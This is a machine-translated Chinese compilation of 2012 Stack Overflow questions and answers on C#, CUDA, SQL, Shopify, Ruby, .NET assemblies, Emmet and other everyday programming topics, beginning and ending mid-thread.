如果您需要再次单击 button2，则需要从另一个按钮事件处理程序或其他东西启用它，以便您有机会在启用它（button2）之前从 this.Controls 集合中删除 tbox8 和 tbox9 以防止应用程序试图创建它们的其他副本。

```
private void button2_Click(object sender, EventArgs e) {
    button2.Enabled = false;
    TextBox tbox8 = new TextBox();
    tbox8.Name = "textBox8";
    tbox8.Location = new System.Drawing.Point(54 + (0), 55);
    tbox8.Size = new System.Drawing.Size(53, 20);
    this.Controls.Add(tbox8);
    tbox8.BackColor = System.Drawing.SystemColors.InactiveCaption;

    TextBox tbox9 = new TextBox();
    tbox9.Name = "textBox9";
    tbox9.Location = new System.Drawing.Point(54 + (60), 55);
    tbox9.Size = new System.Drawing.Size(53, 20);
    this.Controls.Add(tbox9);
    tbox9.BackColor = System.Drawing.SystemColors.InactiveCaption; }

private void button3_Click(object sender, EventArgs e) {
    double result = 0;
    double.TryParse(tbox8.Text, out result);
    tbox9.Text = (double)(result * 2).ToString(); } 
```

# javascript - 以编程方式调用 javascript 函数

> ID：12078067
> 
> 赞同：-1
> 
> 时间：2012-08-22T17:05:38.970
> 
> 标签：javascript, html, objective-c

使用`[NSURLConnection sendSynchronousRequest]`方法，我通过 GET 请求获得来自 html 页面的记录列表。

记录以 20 的间隔分页。要获取第一个页面之后的页面，调用一个函数

```
javascript: GoToPagina (n) 
```

`n`页数在哪里。

如何以编程方式调用该函数？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T17:10:04.593

我的意思是，这取决于您从哪个上下文中调用它。如果您已经导入了包含该函数的脚本，或者它在您正在使用的页面上，您可以像这样调用它：

```
<script type="text/javascript">
var someRandomNumber = 5;
GoToPagina(someRandomNumber);
</script> 
```

但是谁知道你什么时候想调用它，或者从什么上下文，或者在什么条件下等等。

（不是我们，因为您没有指定；））

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T17:14:46.197

您需要`UIWebView`做您所要求的事情，因为这是唯一可以在 iOS 上执行 javascript 的事情。您可以使用相关 URL 加载它，加载完成后：

```
[myWebView stringByEvaluatingJavascriptFromString:
  [NSString stringWithFormat:@"GoToPagina(%d), pageNum]]; 
```

* * *

但是，为了`NSURLConnection`直接使用，您不能使用 JS。取而代之的是，忘记`GoToPagina(n)`函数从哪个 URL 获取数据，然后直接用另一个`NSURLConnection`.

如果您想要的只是数据并且您根本不想显示任何 web 视图，那么这更有可能是您想要做的。

# excel - 有没有办法对数据间隙之间的数字进行操作和计算？

> ID：12078075
> 
> 赞同：0
> 
> 时间：2012-08-22T17:06:16.647
> 
> 标签：excel, excel-2007

我想在同一行的数据组之间进行某些操作。我将设备中的数据存入 Excel。该数据为我提供了屏幕上某个对象位置的时间。但是由于仪器的噪音等原因，有一些数据片段丢失。

有没有办法用这些数据差距之间的数字进行操作和计算？

例如：

![示例数据 SO12078075](../Images/f6814aded5ad5d669d9dc9e7d17c61cf.png)

```
 Cell   Time    Position                   
 ----   ------  --------- ------------- 
 1      0.05 s   12.3  mm                    
 2      0.10 s   12    mm                      
 3      0.15 s   13    mm                      
 4      0.20 s   13.33 mm                   
 5      0.28 s    0    mm (data missing)  
 6      0.30 s    0    mm                       
 7      0.36 s   14.21 mm 
```

因此，在下一列中，我想要最终位置 - 初始位置（整体对象移动）。我希望 Excel 找到`0`并从第一个单元格中减去上面的单元格。在这个例子中，它会是`13.33`-`12.30`我想对下一组数据做同样的事情`14.21 mm`（直到它到达另一个`0`）。

# cuda - 单个 CUDA 内核可以启动的最大线程数

> ID：12078080
> 
> 赞同：13
> 
> 时间：2012-08-22T17:06:24.283
> 
> 标签：cuda, gpu, thrust

我对可以在 Fermi GPU 中启动的最大线程数感到困惑。

我的 GTX 570 设备查询说明如下。

```
 Maximum number of threads per block:           1024
  Maximum sizes of each dimension of a block:    1024 x 1024 x 64
  Maximum sizes of each dimension of a grid:     65535 x 65535 x 65535 
```

根据我的理解，我将上述陈述理解为：

**对于 CUDA 内核，我们最多可以启动 65536 个块。每个启动的块最多可以包含 1024 个线程。因此，原则上，我最多可以启动 65536*1024 (=67108864) 个线程。**

它是否正确？如果我的线程使用很多寄存器怎么办？我们还能达到这个理论上的最大线程数吗？

编写并启动CUDA内核后，我怎么知道我启动的线程数和块数**确​​实已经实例化了**。我的意思是我不希望 GPU 计算一些垃圾或行为怪异，如果我偶然实例化了比该特定内核可能的更多线程。

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-08-22T19:03:26.747

> 对于 CUDA 内核，我们最多可以启动 65536 个块。每个启动的块最多可以包含 1024 个线程。因此，原则上，我最多可以启动 65536*1024 (=67108864) 个线程。

不，这是不正确的。您可以启动最多 65535 x 65535 x 65535 个块的网格，每个块每个块最多有 1024 个线程，尽管每个线程资源限制可能会将每个块的线程总数限制为小于此最大值。

> 如果我的线程使用很多寄存器怎么办？我们还能达到这个理论上的最大线程数吗？

不，在这种情况下，您将无法达到每个块的最大线程数。NVIDIA CUDA 工具包的每个版本都包含一个占用计算器电子表格，您可以使用它来查看寄存器压力对限制块大小的影响。

> 另外，在编写并启动了CUDA内核之后，我怎么知道我启动的线程和块的数量确实已经被实例化了。我的意思是我不希望 GPU 计算一些垃圾，或者奇怪的行为，如果我偶然实例化了比该特定内核可能的更多线程。

If you choose an illegal execution configuration (so incorrect block size or grid size) the kernel will not launch and the runtime will issue a `cudaErrorInvalidConfiguration` error message. You can use the standard `cudaPeekAtLastError()` and `cudaGetLastError()` to check the status of any kernel launch.

# metadata - 在 Shopify 图像上设置和访问元字段

> ID：12078081
> 
> 赞同：1
> 
> 时间：2012-08-22T17:06:28.260
> 
> 标签：metadata, shopify

我正在尝试使用 Shopify API 参考中描述的图像元字段功能，如下所示：

```
"{
"position":1,
"metafields":[
{"key":"variant_sku",
"value":"A176-6053",
"value_type":"string",
"namespace":"global"}
],
"src":"http://some.url/images/000/013/369/original/a176-6053.jpg?1337973636
} 
```

当我在 Rails 控制台中拉起这个产品时，我没有看到元字段（图像对象没有元字段方法），而且我没有运气像这样引用液体模板中的元字段：

```
{{ image.metafields.global.variant_sku }} 
```

我注意到此列表中明显缺少描述元字段可以使用的位置的图像：“您可以存储有关您的产品、变体、系列、订单、博客、页面的其他信息，并且您可以在元字段中购物。”

然而，API 参考中有一个图像示例。我错过了什么？

我的最终目标是通过 API 将 SKU 与图像一起发送，然后通过 Liquid/javascript 访问它以支持针对特定颜色/样式变化显示正确的图像。

感谢您的任何帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-23T12:24:00.893

需要为资源自己请求元字段，默认情况下它们不会嵌入到响应中。API 文档有如何检索它们的示例。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-25T11:11:35.880

看到图片的'alt'标签是元字段，为什么不在图片的alt标签中设置SKU。

您将能够通过 Shopify Liquid 访问“alt”标签的设置值 - 只是您将无法通过 ShopifyAPI 检索“alt”标签。

这是我保存通过 html 表单提交的图像并使用它保存“alt”标签的 Rails 示例...

```
images = params[:images] || nil

if images
 images.each do |image|
      a = ShopifyAPI::Image.new
      a.prefix_options = {:product_id => params[:product_id]}
      a.metafields = [{:key => 'alt', :value => 'Cake', :value_type => "string", :namespace =>  "tags"}]
      a.attachment = Base64.encode64(image.read)
      a.filename = image.original_filename
      a.save
 end
else
.
.
. 
```

希望有帮助。

# sql - SQL Server查询获取行表1 - 没有空值的行表2

> ID：12078086
> 
> 赞同：0
> 
> 时间：2012-08-22T17:06:47.647
> 
> 标签：sql, sql-server, null

```
select 
    id, amount - (select sum(amount) as amount 
                  from table2 
                  where column = 'value' and table1.id = table2.id 
                  group by table2.id) as amount
from 
    table1 
order by 
    table1.id 
```

结果是来自 table1 的所有值 -`amount`除了`table2`不在's`table1.id`中的`table2.id`'s 他们得到空值。

所以这一切都很好，除了我有空值，因为我需要这些作为`table1.amount`值

也尝试过这样的东西，但仍然无法正常工作

```
select 
     id, amount - isnull((select sum(amount) as amount 
                          from table2 
                          where column = 'value' and table1.id = table2.id 
                          group by table2.id), table1.amount) as amount
from 
     table1 
order by 
     table1.id 
```

然后我得到了，`0.00`但是`table1.id`结果集中有 null 的 's 确实有一个真实的金额值`table1.amount`

我需要的概述

```
table 1   values    (1,12 ; 2,27 ; 3,9) table 2   values    (1,9 ; 3,12) result table (1,3 ; 2,27 ; 3,-3) 
```

所以我需要 table1 - 表 2 中的值来获取结果表

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:15:28.803

最好这样做

```
select
t1.id, t1.amount - isnull(t2.amountTable2,0) as 'amount'
from table1 T1
left join (select id, sum(ammunt) as 'amountTable2' from table2 group by Id) T2
       on t1.id = t2.id
order by t1.id 
```

这将得到`Sum`每个 id 的总数，`table2` 然后将按`join`id 计算，并做差值。如果没有 id `table2`，将使用 0

该答案考虑（起初我认为） t2.Id 可以重复如果它是唯一的，则删除该组

```
select
    t1.id, t1.amount - isnull(t2.amount,0) as 'Totalamount'
    from table1 T1
    left join table2 T2
           on t1.id = t2.id
    order by t1.id 
```

# html - 禅编码可以回到以前的水平吗？

> ID：12078089
> 
> 赞同：2
> 
> 时间：2012-08-22T17:06:58.410
> 
> 标签：html, web, emmet

zen 编码是一个不错的工具。但是禅编码可以回到以前的水平吗？看这个例子：

```
<p>
    <span class="footnote1"></span>
<p>
<p>
    <span class="footnote2"></span>
<p>
<p>
    <span class="footnote3"></span>
<p> 
```

首先，我写作`p>span.footnote$`，所以我进入了`<span>`. 禅宗编码中是否有任何缩写可以回到上一级`<p>`。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-22T19:21:53.507

即将重命名为 Emmet 的 Zen Coding 即将发布的版本提供`^`操作员爬上一层树：[https ://github.com/sergeche/emmet-sublime#misc](https://github.com/sergeche/emmet-sublime#misc)

请注意，在当前版本的 Zen Coding 中，您可以使用*分组*来创建复杂的结构：

`(p>span.footnote$)+(.footer>p{This is my copyright})`

您可以在此处获取 Notepad++ 的最新 beta 插件：[https ://github.com/sergeche/zen-coding/downloads](https://github.com/sergeche/zen-coding/downloads)

# ruby - Ruby-保存用户输入

> ID：12078091
> 
> 赞同：1
> 
> 时间：2012-08-22T17:07:05.770
> 
> 标签：ruby

我正在用 Ruby 编写一个课程管理程序，以允许用户向方案添加/删除模块。

目前，我的程序将允许用户添加模块，但是当我尝试删除它们时，我被告知它们不存在。

我用来添加模块的方法是：

```
def self.add_module
# schemes = {}
 scheme_exists = false
 add_another_scheme = true
# module_exists = false
 add_another_module = true

 while add_another_scheme
   print "Enter scheme name: "
   scheme_name = gets
   $schemes.has_key?(scheme_name.chop) ? scheme_exists = true : scheme_exists = false

   if !scheme_exists
     $schemes[scheme_name.chop] = []
     puts "Scheme #{scheme_name.chop} has been added to the system"
   elsif
     scheme_exists = true
     puts "This scheme has already been added"
   end

   while add_another_module
     print "Enter module name: "
     module_name = gets
     $schemes[scheme_name.chop].include?(module_name.chop) ? true : $schemes[scheme_name.chop] << module_name.chop
    # puts "Module #{module_name.chop} has been added to #{scheme_name.chop}"

     # 22/08/2012 at 14:15 Now need to read in each module's unique identifier and year it belongs to
     print "Enter module ID: "
     $module_ID =gets
     $schemes[scheme_name.chop].include?($module_ID.chop) ? true : $schemes[scheme_name.chop] << $module_ID.chop
     $schemes.has_key?($module_ID.chop) ? module_exists = true : module_exists = false

     print "Enter the academic year to which the module belongs: "
     module_year = gets
     $schemes[scheme_name.chop].include?(module_year.chop) ? true : $schemes[scheme_name.chop] << module_year.chop

     if !$module_exists
       $schemes[$module_ID.chop] = []
       puts "Module #{$module_ID.chop} : #{module_name.chop} has been added to #{scheme_name.chop} for the year #{module_year}"
     elsif
       $module_exists = true
       puts "A module with this ID has already been added to the scheme, please check if the module already exists, or choose another ID "
     else
     #  puts "Module #{module_name.chop}, #{module_ID.chop} has been added to #{scheme_name.chop} for the year #{module_year}"
     end

    # puts "Module #{module_name.chop}, #{module_ID.chop} has been added to #{scheme_name.chop}"

     print "Add another module? "
     ask_if_user_wants_to_add_another_module = gets
     if(ask_if_user_wants_to_add_another_module.chop == "y" or ask_if_user_wants_to_add_another_module == "yes")
      add_another_scheme = false
     else if(ask_if_user_wants_to_add_another_module.chop != "y" or ask_if_user_wants_to_add_another_module != "yes")
       Application.main_menu
          end
   end

 end 
```

我用来尝试删除模块的方法是：

```
def self.remove_module

 print "Which scheme would you like to remove a module from? "
 scheme_name = gets
 $schemes.has_key?(scheme_name.chop) ? scheme_exists = true : scheme_exists = false

 if !scheme_exists
   $schemes[scheme_name.chop] = []
   puts "Scheme #{scheme_name.chop} doesn't exist"
 else
 scheme_exists = true
   puts "Which module would you like to remove from #{scheme_name.chop}?"
   $module_ID = gets
   if !$module_exists
     $schemes[$module_ID.chop] = []
     puts "Module #{$module_ID.chop} : does not exist in #{scheme_name.chop} "
   else
     module_exists = true
     puts "Module #{$module_ID.chop} has been removed from #{scheme_name.chop} "
   #  puts "Module #{module_name.chop}, #{module_ID.chop} has been added to #{scheme_name.chop} for the year #{module_year}"
 end
 end

end 
```

当我运行程序时，会显示一个菜单，我选择将一个模块添加到一个方案中，该方案调用第一个方法。我按照以下步骤操作：

1.  输入方案名称——显示一条消息，说明方案已添加到系统中
2.  输入模块名称
3.  输入模块 ID
4.  输入模块所属的学年 -- 将显示一条消息，说明该模块已添加到该年的计划中
5.  有人问我是否要添加另一个模块，所以我说是
6.  程序再次执行相同的步骤，但这次跳过第一个，并从输入模块名称开始——当我再次执行这些步骤时，会显示另一条消息，说明第二个模块已添加到我第二次指定的任何年份都采用相同的方案
7.  然后我被问到是否要添加另一个模块，我在其中输入“n”，然后返回到原始菜单。
8.  这次我选择从方案中删除模块的选项
9.  我被问到我想从哪个方案中删除模块，所以我输入了我添加模块的方案
10.  然后我被问到我想删除哪个模块，所以我输入了我之前添加到它的模块之一，但我被告知该模块在方案中不存在。

这表明我在调用第一种方法（添加模块）时存储在变量中的数据在我调用第二种方法（删除模块）时刚刚被丢弃。

我如何确保这些信息不会丢失？是否有我需要设置和连接我的程序的数据库，或者我需要使用会话和会话变量？还是完全不同的东西？

任何帮助将非常感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:23:06.223

（不是答案。）

我在阅读您的代码时遇到问题。例如：

```
$schemes.has_key?(scheme_name.chop) ? scheme_exists = true : scheme_exists = false
# Did you mean:
scheme_exists = $schemes.has_key?(scheme_name.chop) 
```

和：

```
if !scheme_exists
  $schemes[scheme_name.chop] = []
  puts "Scheme #{scheme_name.chop} doesn't exist"
else
  scheme_exists = true
  # ... 
```

你为什么设置`scheme_exists`为真？你刚刚测试它*不是*真的。

您的“方案存在”看起来很像您的“模块存在”，如果它们相同，则使它们相同。有很多`chop`ping 正在进行，也许您应该在输入后切碎并停止在其他任何地方切碎——这似乎容易出错并增加了很多噪音。

总的来说，我发现如果不实际单步执行代码，就很难推理出你的代码。我建议重构，让事情像您要解决的问题一样“大声”读出。

我们也不知道有没有其他的东西`$schemes`。您是否“应该”使用数据库*完全*取决于您的目标、您的约束、您运行应用程序的方式等。您还可以序列化 YAML、编写纯文本文件等等。

如果您重新启动/重新运行该应用程序，您显然会丢失所有未保存的数据。如果您一直呆在应用程序中，那么很可能代码或您的假设是错误的，但是由于代码的结构和命名方式，查看代码并确定是一项繁重的任务。

# c# - 相同引用程序集的多个版本

> ID：12078093
> 
> 赞同：3
> 
> 时间：2012-08-22T17:07:11.320
> 
> 标签：c#, telerik

我有一个问题，目前无法解决。

我有一个从文件夹加载插件（.dll 程序集）的程序集（一个可执行的 .net 4.0）。主可执行文件引用了 telerik.windows.controls.dll 并且运行良好。

现在我编写了一个新插件，它使用较新版本的 Telerik 库，更具体地说，是程序集 telerik.windows.controls.GanttView。问题是 GanttView 控件使用较新版本的 Telerik.windows.controls.dll，因此我遇到了崩溃，因为插件无法加载 Telerik 引用的程序集。

我知道我可以通过将所有组件升级到最新的一组引用程序集 (telerik) 来解决这个问题，但我的团队尚未对这些控件进行 QA/测试，以确保不会引入新的错误。

所以，总结一下：

main.exe -> a.dll -> X.dll (v1)

然后我添加了一个名为 b.dll 的新插件，因此：

main.exe ->b.dll-> X.dll (v2) +------------> X.dll (v1)

所以问题是我的插件可以从不同的位置引用不同版本的程序集（以及它引用的程序集），因为现在它加载了由主程序集加载的程序集。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T17:12:18.077

简短的回答是否定的，如果较新的 dll 具有相同的程序集信息。

更长的答案是，在应用程序域中（除非您自己创建更多，否则您不会拥有多个），您只能加载一次特定的程序集。再一次，这是假设我们正在谈论的程序集 (dll) 具有相同的程序集信息。如果要加载较新的程序集，则必须创建一个单独的应用程序域。但是，您将无法在初始应用程序域中使用它，您的其他控件正在“生活”。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T17:17:25.947

我们在我们的应用程序中的某个时间点完成了这一点。我们这样做的方法是在 bin 目录中创建一个包含过期 dll 的文件夹，然后将以下行添加到引用旧 dll 的 app.config 文件中......

```
<runtime>
    <assemblyBinding xmlns = "urn:schema-microsoft-com:asm.v1">
        <dependentAssembly>
            <assemblyIdentity 
                name = "YourAssembly"
                />
            <codeBase version="YourAssemblyVersion" href = "FolderWithinBinDirectory/YourAssembly.dll"/>
        </dependentAssembly>
    </assemblyBinding>
</runtime> 
```

可能还有更多，但我认为这就是我们所要做的。

# expression-blend - 如何使用 WinJS 检测设计模式？

> ID：12078096
> 
> 赞同：3
> 
> 时间：2012-08-22T17:07:30.470
> 
> 标签：expression-blend, winjs

在 Blend for Visual Studion 2012 中查看时，我有一些 javascript 会导致问题。我想对设计模式进行简单检查，以便在 Blend Design Surface 中查看时可以跳过代码。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-22T17:07:30.470

我在推特上发布了这个问题，很快就得到了同行的回答。

```
var isInDesignMode = Windows.ApplicationModel.DesignMode.designModeEnabled; 
```

# db2 - MAX(), GROUP BY 错误

> ID：12078098
> 
> 赞同：0
> 
> 时间：2012-08-22T17:07:32.387
> 
> 标签：db2, max

在 DB2 V9 Z/O 上

三行以下的查询。

```
SELECT J01_REGION, I20_MMS_NO, I20_CONSUMER_ID, I21_CONSUMER_ID, I21_CASE_ID,
I42_FIN_MGR_PROV, J01_PROVIDER, I21_CASE_OPEN_DT, I42_FM_BEG_DT
FROM SERDB.I20_CONSUMER_T INNER JOIN SERDB.I21_CONS_CASE_T ON I20_CONSUMER_ID = 
I21_CONSUMER_ID
INNER JOIN SERDB.I42_FIN_MGR_T ON I21_CASE_ID = I42_CASE_ID 
INNER JOIN SERDB.J01_PROVIDER_T ON I42_FIN_MGR_PROV = J01_PROVIDER
WHERE J01_REGION = 2
AND I20_CONSUMER_ID = 96603 
```

我希望查询通过使用 I21_CASE_OPEN_DT 和 I42_FM_BEG_DT 的 MAX 值仅返回一行。如果我使用：

```
SELECT J01_REGION, I20_MMS_NO, I20_CONSUMER_ID, I21_CONSUMER_ID, I21_CASE_ID,  MAX 
(I21_CASE_OPEN_DT), MAX(I42_FM_BEG_DT), I42_FIN_MGR_PROV, J01_PROVIDER
FROM SERDB.I20_CONSUMER_T INNER JOIN SERDB.I21_CONS_CASE_T ON I20_CONSUMER_ID = 
I21_CONSUMER_ID 
INNER JOIN SERDB.I42_FIN_MGR_T ON I21_CASE_ID = I42_CASE_ID 
INNER JOIN SERDB.J01_PROVIDER_T ON I42_FIN_MGR_PROV = J01_PROVIDER
WHERE J01_REGION = 2
AND I20_CONSUMER_ID = 96603; 
```

我收到： SQL0122N 没有 GROUP BY 子句的 SELECT 语句在 SELECT 子句中包含列名或表达式和列函数，或者列名或表达式包含在 SELECT 子句中但不包含在 GROUP BY 子句中。SQLSTATE=42803

如果我使用：

```
SELECT J01_REGION, I20_MMS_NO, I20_CONSUMER_ID, I21_CONSUMER_ID, I21_CASE_ID,
I42_FIN_MGR_PROV, J01_PROVIDER, I21_CASE_OPEN_DT, I42_FM_BEG_DT
FROM SERDB.I20_CONSUMER_T INNER JOIN SERDB.I21_CONS_CASE_T ON I20_CONSUMER_ID = 
I21_CONSUMER_ID 
INNER JOIN SERDB.I42_FIN_MGR_T ON I21_CASE_ID = I42_CASE_ID 
INNER JOIN SERDB.J01_PROVIDER_T ON I42_FIN_MGR_PROV =  J01_PROVIDER
WHERE J01_REGION = 2
AND I20_CONSUMER_ID = 96603
AND MAX(I21_CASE_OPEN_DT)
AND MAX(I42_FM_BEG_DT); 
```

我收到：SQL0199N 在“AND”之后使用保留字“AND”无效。预期的令牌可能包括：“MICROSECONDS MICROSECOND SECONDS SECOND MINUTES MINUTE HOURS”。SQLSTATE=42601

有人对我还能做什么有建议吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T17:16:54.543

第二个错误告诉你所有你需要知道的：

> 没有 GROUP BY 子句的 SELECT 语句在 SELECT 子句中包含列名或表达式和列函数，或者列名或表达式包含在 SELECT 子句中但不包含在 GROUP BY 子句中

如果您使用聚合（`MAX`、`MIN`等），您必须按 select 语句中的所有其他字段进行分组，您还没有这样做。

进行第二个查询，并添加 GROUP BY 子句让我们得到这个：

```
SELECT J01_REGION, I20_MMS_NO, I20_CONSUMER_ID, I21_CONSUMER_ID, I21_CASE_ID,  
    MAX (I21_CASE_OPEN_DT), MAX(I42_FM_BEG_DT), I42_FIN_MGR_PROV, J01_PROVIDER
FROM SERDB.I20_CONSUMER_T INNER JOIN SERDB.I21_CONS_CASE_T ON I20_CONSUMER_ID = 
I21_CONSUMER_ID 
INNER JOIN SERDB.I42_FIN_MGR_T ON I21_CASE_ID = I42_CASE_ID 
INNER JOIN SERDB.J01_PROVIDER_T ON I42_FIN_MGR_PROV = J01_PROVIDER
WHERE J01_REGION = 2
    AND I20_CONSUMER_ID = 96603
GROUP BY J01_REGION, I20_MMS_NO, I20_CONSUMER_ID, I21_CONSUMER_ID, I21_CASE_ID,
    I42_FIN_MGR_PROV, J01_PROVIDER; 
```

# sql - 从基于动态 SQL 的 oracle 查询中提取列和表名

> ID：12078101
> 
> 赞同：1
> 
> 时间：2012-08-22T17:07:45.483
> 
> 标签：sql, oracle, oracle10g

我想要一个方法/代码片段来从 oracle 查询中提取列名和相应的表名。查询以及列名和表名在运行时会发生变化，并且通常会计算一些列名，这意味着它们被包装在函数中并具有别名。我尝试了不同的字符串标记技术，使用正则表达式根据 expeted 输出将其分离出来，但到目前为止，还没有运气！例如：

```
select mandate_name, investment_sub_team_name,
fn_sum(REG_INV_CMP_AUM) REG_INV_CMP_AUM, 
fn_sum(NON_REG_INV_CMP_AUM) NON_REG_INV_CMP_AUM
from DM_SAI_VALUATIONS_STEP3
where position_interval_type = 'E'
and position_type = 'T'
group by mandate_name, investment_sub_team_name; 
```

我希望列的输出为：

```
任务名称
投资子团队名称
fn_sum(REG_INV_CMP_AUM)
fn_sum(NON_REG_INV_CMP_AUM)

```

上面的注释：我想要具有函数而不是别名的列

我希望表名的输出为： DM_SAI_VALUATIONS_STEP3 针对我上面列出的所有列

我无法编辑查询，因为它们是 xml 输出的一部分。所以，我无法更改别名。第二点是从查询中提取表名。请考虑这样一个事实，因为包含列和表的查询会有所不同，所以没有什么可以像字符串标记的位置等那样被硬编码。我正在寻找一种通用的方法来标记它们。因此，对于我期望的列输出，我也只需要表名。它总是在 from 子句中只指向一个表，因此提取它不会成为问题。

预期输出：

```
Column Name                          Table Name
-----------                          ----------
mandate_name                         DM_SAI_VALUATIONS_STEP3
investment_sub_team_name             DM_SAI_VALUATIONS_STEP3
fn_sum(REG_INV_CMP_AUM)              DM_SAI_VALUATIONS_STEP3
fn_sum(NON_REG_INV_CMP_AUM)          DM_SAI_VALUATIONS_STEP3 
```

任何帮助公关指针将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T17:55:14.063

如果不编写自己的 SQL 编译器（至少是语义分析阶段的解析器和词法分析器），您实际上无法解决这个问题。这是一个非常重要的练习，特别是如果您想接受任何有效的 Oracle SQL 查询。Oracle Corporation 曾经为 SQL VM 和 PL/SQL VM 提供不同的 SQL 解析器，并且无法使它们保持同步——随着支持的 SQL 语法的改进，不断发展您的解析器是一项重大的时间和精力投资。

如果你真的决定走这条路，你可以从一些[ANTLR SQL 语法](http://www.antlr.org/grammar/list)开始。O'Reilly [Flex 和 Bison 书中](http://my.safaribooksonline.com/book/programming/flex/9780596805418)还有一章是关于解析 SQL 的，您可以将其用作起点。当然，您需要修改和扩展语法以支持您的查询可能包含的任何 SQL 功能。然后，您需要构建编译器的语法分析器和语义分析部分，以实现适当的范围解析规则，以便能够确定对特定列的特定引用来自哪个表。重申一下，这是一项重要的练习，并且必须针对数据库的每个新版本进行增强。

如果您可以放宽您的要求并对您将要看到的查询类型做出一些假设，那么编写解析器会变得容易得多。如果您可以保证每个查询都准确引用 1 个表，那么识别特定列来自哪个表会容易得多。如果您可以保证每个函数调用最多将一个表中的一列作为参数，那也会使事情变得更容易——否则，如果该列是将来自多个表的列作为参数的函数的结果。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T18:54:10.617

我也同意这通常是不可能的。但也许解决方案是与 XML 消息的创建者取得联系，并就不同的协议达成一致，然后`SELECT`事先完成声明。同意他发送专栏。

如果这是不可能的，并且您想对查询的构建方式做出某些假设，那么您可以使用作为分隔符在 the 之后`select`和之前进行标记。但据我所知，您不能通过正则表达式子字符串命令真正做到这一点。我认为您需要编写一些 PL/SQL 函数。`from``,`

但仍然要注意`from`关键字可能是选择列的一部分。如果你突然收到这样的查询，你会怎么做：

```
select 
  something, 
  (select count(*) from othertable) as cnt, 
  andfromthiscolumn xyz 
from mytable 
```

所以我的建议是在组织上对其进行整理，然后尝试编写不可能的代码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T18:52:18.607

如果您知道查询字符串的结构不会发生太大变化，则可以执行以下操作：

```
set serveroutput on
set termout on
clear
declare
  v_str varchar2(500) := 'select mandate_name, investment_sub_team_name,
fn_sum(REG_INV_CMP_AUM) REG_INV_CMP_AUM, 
fn_sum(NON_REG_INV_CMP_AUM) NON_REG_INV_CMP_AUM
from DM_SAI_VALUATIONS_STEP3
where position_interval_type = ''E''
and position_type = ''T''
group by mandate_name, investment_sub_team_name;';
  v_tmp varchar2(500);
  v_cols varchar2(500);
  v_table varchar2(500);
begin
  v_tmp := replace( v_str, 'select ','');
  v_tmp := substr( v_tmp, 1, instr(v_tmp, 'where')-1);

  dbms_output.put_line('original query: '||v_str);  

  v_cols := substr (v_tmp, 1, instr(v_tmp, 'from')-1);
  dbms_output.put_line('column names: '||v_cols);

  v_table := substr(v_tmp, instr(v_tmp, 'from ')+4, 500);
  dbms_output.put_line('table name: '||v_table);
end; 
```

# iphone - 在 Cocos2d iphone 中为 CCMenuItem 设置动画

> ID：12078112
> 
> 赞同：0
> 
> 时间：2012-08-22T17:08:17.303
> 
> 标签：iphone, ios, cocos2d-iphone

我在下面创建了这段代码，以在 init 语句的视图中显示一个按钮：

```
 CCMenuItem *contacts = [CCMenuItemImage 
                            itemFromNormalImage:@"play.png" selectedImage:@"play.png" 
                            target:self selector:@selector(switchcontact)];
    contacts.position = ccp(300, 550);
    CCMenu *starMenu6 = [CCMenu menuWithItems:contacts, nil];
    starMenu6.position = CGPointZero;
    [self addChild:starMenu6]; 
```

我需要在视图中的相同位置旋转或动画这个按钮，就像 Fruitninjas 菜单按钮一样。我怎么能这样做？

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T18:21:56.117

不熟悉水果忍者方法，但要旋转联系人菜单按钮：

```
[contacts runAction:[CCRepeatForever actionWithAction:[CCRotateBy actionWithDuration:.5 angle:45]]]; 
```

您也可以在菜单上进行操作，它们都是 CCNode。

# c - 安装 BRugs 时出错“C 编译器无法创建可执行文件”

> ID：12078117
> 
> 赞同：1
> 
> 时间：2012-08-22T17:08:31.123
> 
> 标签：c, r, gcc, compiler-construction

我正在尝试在我的 Ubuntu 12.04 桌面上安装 R 库 BRugs。

```
> sessionInfo()
R version 2.15.1 (2012-06-22)
Platform: x86_64-pc-linux-gnu (64-bit) 
```

但我收到以下错误：

```
* installing *source* package ‘BRugs’ ...
** package ‘BRugs’ successfully unpacked and MD5 sums checked
checking for prefix by checking for OpenBUGS... /usr/bin/OpenBUGS
checking for gcc... gcc
checking whether the C compiler works... no
configure: error: in `/tmp/RtmpnNLTG1/R.INSTALL488b7635d4c0/BRugs':
configure: error: C compiler cannot create executables
See `config.log' for more details
ERROR: configuration failed for package ‘BRugs’
* removing ‘/home/myuser/lib/R/BRugs’
Warning in install.packages("BRugs") :
  installation of package ‘BRugs’ had non-zero exit status

The downloaded source packages are in
    ‘/tmp/Rtmp2ytOWn/downloaded_packages’ 
```

这是[config.log](http://dl.dropbox.com/u/18092793/config.log)的链接。很难判断错误是什么，除了错误以 . 开头`gcc: error: unrecognized option '-V'`。

我怎样才能绕过这个错误（并安装 BRugs）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T18:29:22.987

根据包装说明：

> 在 Linux 和 Windows 下的 64 位 R 上运行的版本处于“测试”状态，效率较低。

看起来`configure`正在尝试使用 32 位可执行文件构建包（注意`-m32`标志）。最好联系包维护者并询问他们如何在 64 位 Ubuntu 下构建 32 位可执行文件。

# c++ - 减慢终端上的 C++ 输出

> ID：12078119
> 
> 赞同：2
> 
> 时间：2012-08-22T17:08:38.733
> 
> 标签：c++, ascii, ascii-art

我编写了一个模拟*生命游戏的*程序。基本上这个世界是由一个二维的 std::vector 实现的`bool`。如果`bool`为真，则细胞是活的，如果为假，则细胞是死的。程序的输出是每个时间步的系统，完全是 ASCII 码：

```
[ ][0][ ]
[ ][ ][0]
[0][0][0] 
```

